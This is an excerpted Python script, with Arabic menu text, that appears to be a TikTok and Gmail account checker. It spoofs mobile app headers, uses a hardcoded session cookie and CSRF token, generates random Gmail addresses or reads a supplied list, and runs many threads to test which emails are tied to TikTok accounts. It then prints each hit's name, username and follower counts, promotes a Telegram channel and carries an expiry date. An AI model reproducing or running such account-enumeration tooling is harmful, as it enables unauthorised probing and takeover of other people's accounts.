import webbrowser
webbrowser.open('https://t.me/MNZS5')
import datetime
an = datetime.datetime.now()
an2 = datetime.datetime(2025, 4, 24, 0, 00, 00)#تحكم بالوقت
if an > an2 or an == an2:
...
'User-Agent': 'okhttp/3.14.7',
    ...
    ff = (f'''
𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝑇𝐼𝐾𝑇𝑂𝐾𓊇       ────────━𓆩‌𝗘𝗕𝗢𓆪‏━────────
 𝐇𝐢𝐭: [  {hit}   ] 
🐯𝙘𝙤𝙧𝙧𝙚𝙘𝙩 : {(che(email,folos,vid,folon))}
🐯𝙣𝙖𝙢𝙚 [ {name} ] 
🐯𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚  [ {user} ]
...
def Gmail(email):
    ...
    headers = {
        ...
        'user-agent': '2021306050 (Linux; U; Android 13; ar_AE; SM-S918B; Build/TP1A.220624.014; Cronet/TTNetVersion:57844a4b 2019-10-16',
    ...
    if "password"in response:
        ...
        ge+=1
        print(f"\r       {F}True {HH}: {M}{ge} ~ {Z}False {HH}: {M}{bt} ~ {X}Not {HH}: {M}{be} {G}\r")
    else:
        os.system('cls'if os.name=="nt"else"clear")
        be+=1
        print(f"\r       {F}True {HH}: {M}{ge} ~ {Z}False {HH}: {M}{bt} ~ {X}Not {HH}: {M}{be} {G}\r")
...
def para():
	global session,secret,session_id
	cookies ={
        "passport_csrf_token": secret,
        "passport_csrf_token_default": secret,
        "sessionid":"c44d45243517f8baa5a6a923f19c4c03"
      }
...
{Z}═════════════════════════════
{S}1 - {A}عشوائي جيميل  
{S}2 - {A}فحص لسته جيميل
{Z}═════════════════════════════
{M}Devoleber : {X}[@M2M0M8]
'''
     print(admin)
     try:
        ii=int(input(f'{S}Choose What You Want In Choices? : '))
        if ii==1:
               for i in range(5):
                    threading.Thread(target=hso1).start()
        elif ii==2:
               os.system("cls"if os.name=="nt"else"clear")
